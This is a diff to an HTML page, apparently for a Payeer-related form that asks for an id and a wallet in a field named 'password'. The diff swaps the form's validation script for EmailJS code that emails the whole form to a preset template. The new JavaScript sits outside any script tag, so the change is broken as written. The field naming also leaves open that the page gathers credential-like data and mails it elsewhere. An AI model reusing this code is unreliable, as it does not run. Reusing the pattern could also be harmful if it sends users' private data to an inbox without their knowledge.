@@ -481,22 +481,35 @@ table{
 </form>
 </div>
 </div>
+	
+<script type="text/javascript"
+  src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
+<script type="text/javascript">
+  emailjs.init('Y8yHPgTAZoZVlMjzZ')
+</script>
 
 <!--Javascript de confirmação de envios de formulários. Script conectado com modalbox4-->
-<script type="text/javascript">
-	function validate(){
-	var name = document.form.name.value;
-	var password = document.form.password.value;
-	
-	if(name ==null || name ==""){
-		alert("Insira o id.");
-		return false;
-	}else if(password.length<1){
-	alert("Insira a sua carteira Payeer.");
-	return false;
-	}
-	}
-</script>
+const btn = document.getElementById('button');
+
+document.getElementById('form')
+ .addEventListener('submit', function(event) {
+   event.preventDefault();
+
+   btn.value = 'Sending...';
+
+   const serviceID = 'default_service';
+   const templateID = 'template_mog6f98';
+
+   emailjs.sendForm(serviceID, templateID, this)
+    .then(() => {
+      btn.value = 'Send Email';
+      alert('Sent!');
+    }, (err) => {
+      btn.value = 'Send Email';
+      alert(JSON.stringify(err));
+    });
+});
 
 <!--<script type="text/javascript" charset="utf-8">
 	document.querySelector("#userBox").addEventListener("click", function(){
